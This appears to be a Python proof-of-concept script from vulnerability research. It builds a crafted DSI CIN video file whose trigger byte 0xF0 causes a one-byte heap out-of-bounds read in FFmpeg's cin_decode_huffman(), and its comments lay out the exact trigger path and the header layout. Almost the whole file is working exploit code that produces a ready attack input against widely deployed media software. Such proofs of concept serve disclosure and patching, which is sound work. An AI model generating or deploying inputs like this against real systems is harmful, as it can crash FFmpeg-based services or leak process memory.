#!/usr/bin/env python3
"""
PoC generator for VULN 002 - CWE-125 OOB Read in cin_decode_huffman()

Vulnerability: In cin_decode_huffman() (dsicinvideo.c lines 111 & 120),
when the last byte of src data has upper nibble == 0xF (line 111) or
lower nibble == 0xF (line 120), `*src++` is executed without checking
src < src_end, reading 1 byte past the end of the heap allocation.

Trigger path:
  ffmpeg -i crafted.cin -f null -
  -> cin_read_packet() (dsicin.c)
  -> cinvideo_decode_frame() (dsicinvideo.c)
  -> cin_decode_huffman(buf, 16, ...) with video_frame_type=35
  -> decode loop: last byte has upper nibble 0xF -> OOB read at *src++
"""

import struct

OUTPUT = "vuln_002_input.cin"

# ---------------------------------------------------------------------------
# File Header (20 bytes)
# Offsets verified against cin_read_file_header() in dsicin.c:
#   [0]  u32le  magic           = 0x55AA0000
#   [4]  u32le  video_frame_size (used by decoder init, set to 16)
#   [8]  u16le  video_frame_width
#   [10] u16le  video_frame_height
#   [12] u32le  audio_frequency  = 22050  (checked by probe)
#   [16] u8     audio_bits       = 16     (checked by probe)
#   [17] u8     audio_stereo     = 0      (checked by probe)
#   [18] u16le  audio_frame_size
# ---------------------------------------------------------------------------
MAGIC_FILE  = 0x55AA0000
video_frame_size_hdr  = 16   # file-level field (informational here)
video_frame_width     = 4    # small frame so bitmap_size = 4*4 = 16 >= 15
video_frame_height    = 4
audio_frequency       = 22050
audio_bits            = 16
audio_stereo          = 0
audio_frame_size_hdr  = 0    # no audio data in this PoC

file_header = struct.pack(
    "<IIHHIBBH",
    MAGIC_FILE,
    video_frame_size_hdr,
    video_frame_width,
    video_frame_height,
    audio_frequency,
    audio_bits,
    audio_stereo,
    audio_frame_size_hdr,
)
assert len(file_header) == 20, f"file header size {len(file_header)}"

# ---------------------------------------------------------------------------
# Frame Header (16 bytes)
# Offsets verified against cin_read_frame_header() in dsicin.c:
#   [0]  u8     video_frame_type  = 35  (huffman path in cinvideo_decode_frame)
#   [1]  u8     audio_frame_type  = 0
#   [2]  u16le  pal_colors_count  = 0   (no palette; palette_type=0)
#   [4]  u32le  video_frame_size  = 16  (15 huff table + 1 trigger byte)
#   [8]  u32le  audio_frame_size  = 0
#   [12] u32le  magic             = 0xAA55AA55
# ---------------------------------------------------------------------------
MAGIC_FRAME      = 0xAA55AA55
video_frame_type = 35    # case 35 in cinvideo_decode_frame -> cin_decode_huffman
audio_frame_type = 0
pal_colors_count = 0
video_frame_size = 16    # 15 bytes huff table + 1 trigger byte
audio_frame_size = 0

frame_header = struct.pack(
    "<BBHIII",
    video_frame_type,
    audio_frame_type,
    pal_colors_count,
    video_frame_size,
    audio_frame_size,
    MAGIC_FRAME,
)
assert len(frame_header) == 16, f"frame header size {len(frame_header)}"

# ---------------------------------------------------------------------------
# Video payload (video_frame_size = 16 bytes)
#
# cin_decode_huffman layout:
#   bytes [0..14]  -> huff_code_table[15]  (memcpy, src += 15)
#   byte  [15]     -> huff_code = *src++   (src now == src_end)
#
# If upper nibble of byte[15] == 0xF:
#   b = huff_code << 4
#   huff_code = *src++;   <-- src == src_end: ONE BYTE PAST END (OOB read)
#
# We use 0xF0: upper nibble = 0xF, lower nibble = 0 (avoids the second
# OOB at line 120 for clarity, but upper nibble alone is sufficient).
# ---------------------------------------------------------------------------
huff_table  = bytes(15)      # 15 zero bytes as the huffman code table
trigger_byte = bytes([0xF0]) # upper nibble == 0xF -> triggers line 111 OOB
video_data   = huff_table + trigger_byte
assert len(video_data) == 16

# ---------------------------------------------------------------------------
# Assemble final file
# The demuxer reads:  file_header | frame_header | raw_video_bytes | audio_bytes
# The packet handed to the decoder is constructed in memory as:
#   [palette_type(1)] [pal_count_lo(1)] [pal_count_hi(1)] [frame_type(1)]
#   [palette bytes]   [video_frame_size raw bytes from file]
# With pal_colors_count=0 there are no palette bytes; the 16 raw bytes
# are exactly `video_data`.
# ---------------------------------------------------------------------------
cin_file = file_header + frame_header + video_data
# No audio bytes (audio_frame_size = 0).

with open(OUTPUT, "wb") as f:
    f.write(cin_file)

print(f"[+] Written {len(cin_file)} bytes to {OUTPUT}")
print(f"    file_header  : {len(file_header)} bytes  (magic=0x55AA0000)")
print(f"    frame_header : {len(frame_header)} bytes  (video_frame_type=35, video_frame_size=16)")
print(f"    video_data   : {len(video_data)} bytes  (15 huff-table + 0xF0 trigger)")
print(f"[+] Expected: OOB read 1 byte past video_data allocation in cin_decode_huffman()")
